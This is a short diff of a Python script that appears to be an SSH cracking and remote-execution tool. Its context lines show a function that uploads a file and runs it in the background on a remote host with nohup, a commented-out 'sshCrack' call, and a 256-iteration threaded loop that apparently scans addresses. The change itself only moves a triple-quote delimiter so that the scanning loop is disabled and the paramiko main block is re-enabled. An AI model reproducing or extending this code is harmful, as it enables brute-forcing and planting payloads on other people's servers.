@@ -41,6 +41,8 @@ def UploadFileAndExecute(sshConnection, fileName) :
 	ssh.exec_command("nohup /tmp/" +fileName+ " &")
 
 
+
+'''
 #if __name__ == "__main__" :
 #	sshCrack(sys.argv[1], sys.argv[2])
 
@@ -52,9 +54,6 @@ for i in range(256):
         t.start()
         time.sleep(1)
 
-
-
-'''
 if __name__ == "__main__" :
 
 	ssh = paramiko.SSHClient()
